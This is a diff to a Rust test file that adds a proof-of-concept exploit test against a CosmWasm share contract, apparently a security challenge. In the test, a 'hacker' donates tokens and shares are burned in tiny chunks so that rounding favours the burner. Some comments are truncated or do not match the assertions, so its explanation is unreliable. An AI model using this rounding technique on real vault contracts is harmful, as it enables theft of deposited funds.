@@ -3,9 +3,9 @@ pub mod tests {
     use crate::{
         contract::DENOM,
         msg::{ExecuteMsg, InstantiateMsg, QueryMsg},
-        state::Balance,
+        state::{Balance, Config},
     };
-    use cosmwasm_std::{coin, Addr, Empty, Uint128};
+    use cosmwasm_std::{coin, Addr, CosmosMsg, Empty, Uint128};
     use cw_multi_test::{App, Contract, ContractWrapper, Executor};
 
     pub fn challenge_contract() -> Box<dyn Contract<Empty>> {
@@ -124,5 +124,71 @@ pub mod tests {
             .query_balance(contract_addr.to_string(), DENOM)
             .unwrap();
         assert_eq!(bal.amount, Uint128::zero());
+    }
+
+    const HACKER: &str = "hacker";
+
+    #[test]
+    fn exploit_burn_rounding_skimming() {
+        // base scenario with 0 funds
+        let (mut app, contract_addr) = proper_instantiate();
+
+        // mint funds to user
+        app = mint_tokens(app, USER.to_owned(), Uint128::new(10_000));
+        app.execute_contract(
+            Addr::unchecked(USER),
+            contract_addr.clone(),
+            &ExecuteMsg::Mint {},
+            &[coin(10_000, DENOM)],
+        )
+        .unwrap();
+
+        // mint shares for hacker
+        app = mint_tokens(app, HACKER.to_owned(), Uint128::new(20_000));
+        app.execute_contract(
+            Addr::unchecked(HACKER),
+            contract_addr.clone(),
+            &ExecuteMsg::Mint {},
+            &[coin(10_000, DENOM)],
+        )
+        .unwrap();
+
+        // Hacker bank sends token
+        app.execute(
+            Addr::unchecked(HACKER),
+            CosmosMsg::Bank(cosmwasm_std::BankMsg::Send {
+                to_address: contract_addr.to_string(),
+                amount: vec![coin(3, DENOM)],
+            }),
+        ).unwrap();
+
+        // Supply can deviate from
+        let Config { total_supply } = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &QueryMsg::GetConfig {})
+            .unwrap();
+        assert_eq!(total_supply, Uint128::new(20_000));
+
+        // We show how user can withdraw more than they deposited
+        // by burning shares in small chunks that round to hacker's favor
+        for _ in 0..100 {
+            app.execute_contract(
+                Addr::unchecked(USER),
+                contract_addr.clone(),
+                &ExecuteMsg::Burn {
+                    shares: Uint128::new(1),
+                },
+                &[],
+            )
+            .unwrap();
+        }
+        assert_eq!(
+            app.wrap().query_balance(USER, DENOM).unwrap().amount,
+            Uint128::new(100)
+        );
+
+        let res = Uint128::new(1)
+            .multiply_ratio(Uint128::new(4), Uint128::new(3));
+        assert_eq!(res, Uint128::new(1));
     }
 }
